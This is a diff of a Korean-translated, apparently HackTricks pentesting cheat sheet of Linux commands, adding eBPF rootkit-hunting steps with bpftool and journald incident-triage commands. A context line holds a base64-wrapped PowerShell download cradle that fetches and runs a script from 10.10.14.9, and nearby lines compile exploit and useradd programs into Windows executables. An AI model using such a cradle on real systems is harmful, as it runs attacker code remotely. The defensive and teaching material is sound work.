@@ -1,4 +1,4 @@
-# 유용한 리눅스 명령어
+# 유용한 Linux 명령어
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -121,7 +121,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-## 윈도우용 Bash
+## Windows용 Bash
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -141,7 +141,7 @@ python pyinstaller.py --onefile exploit.py
 #sudo apt-get install gcc-mingw-w64-i686
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
-## 그렙스
+## Greps
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -257,7 +257,7 @@ nmap --script-help "(default or version) and *smb*"
 locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
 nmap --script-help "(default or version) and smb)"
 ```
-## 배시
+## Bash
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
@@ -293,4 +293,46 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
+## eBPF Telemetry & Rootkit Hunting
+
+최신 rootkits(TripleCross, BPFDoor variants 등)는 점점 더 숨겨진 eBPF programs로 상주합니다. `bpftool`/`eBPFmon`으로 대상 시스템들의 베이스라인을 수집해, 서명되지 않은 프로그램, 예기치 않은 cgroup hooks 또는 악성 map 내용을 분리하기 전에 찾아내세요.
+```bash
+#Enumerate all eBPF programs, attach points, owning PIDs and map IDs
+sudo bpftool prog
+
+#Inspect suspicious bytecode + helper calls (replace 835 with the target program id)
+sudo bpftool prog dump xlated id 835 | less
+
+#List and dump program maps to reveal covert sockets/credentials (replace 104 accordingly)
+sudo bpftool map show id 104
+sudo bpftool map dump id 104 | hexdump -C
+
+#Verify kernel feature support before loading/patching custom probes
+sudo bpftool feature probe | less
+
+#TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
+sudo ebpfmon
+```
+bpftool 출력과 예상되는 NIC/cgroup 연결을 상호 연관시키세요; 승인되지 않은 PID가 소유한 갑작스러운 `xdp` 또는 `kprobe` 프로그램은 주입된 eBPF 페이로드의 강력한 지표입니다.
+
+## Journald 인시던트 분류
+
+systemd-journald는 구조화된 메타데이터를 보관하므로 `/var/log/*`를 건드리지 않고도 boot, severity, unit, 또는 UID별로 피벗할 수 있습니다. 필터를 상대 타임스탬프와 결합하여 공격 창을 격리하거나 로그 변조를 빠르게 입증하세요.
+```bash
+journalctl --list-boots                                #Enumerate boot IDs with timestamps
+journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
+journalctl -u nginx.service --since="2025-06-01 01:00" --until="2025-06-01 02:00"
+journalctl -u ssh.service -f | grep "Failed password"  #Live brute-force monitoring
+journalctl _UID=0 --output=json-pretty --since "1 hour ago"
+journalctl --disk-usage                               #Quickly show journal size
+sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
+journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
+```
+필터를 더 엄격하게 적용해야 할 때 `--grep 'Invalid user' --case-sensitive` 또는 `-k` (kernel ring buffer only)를 추가하고, `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME`, `_TRANSPORT` 선택자는 multi-tenant hunts에서 함께 적용된다는 것을 기억하세요.
+
+## References
+
+- [eBPFmon: A new tool for exploring and interacting with eBPF applications](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [How to use the journalctl command to view Linux logs](https://www.hostinger.com/tutorials/journalctl-command)
+
 {{#include ../banners/hacktricks-training.md}}
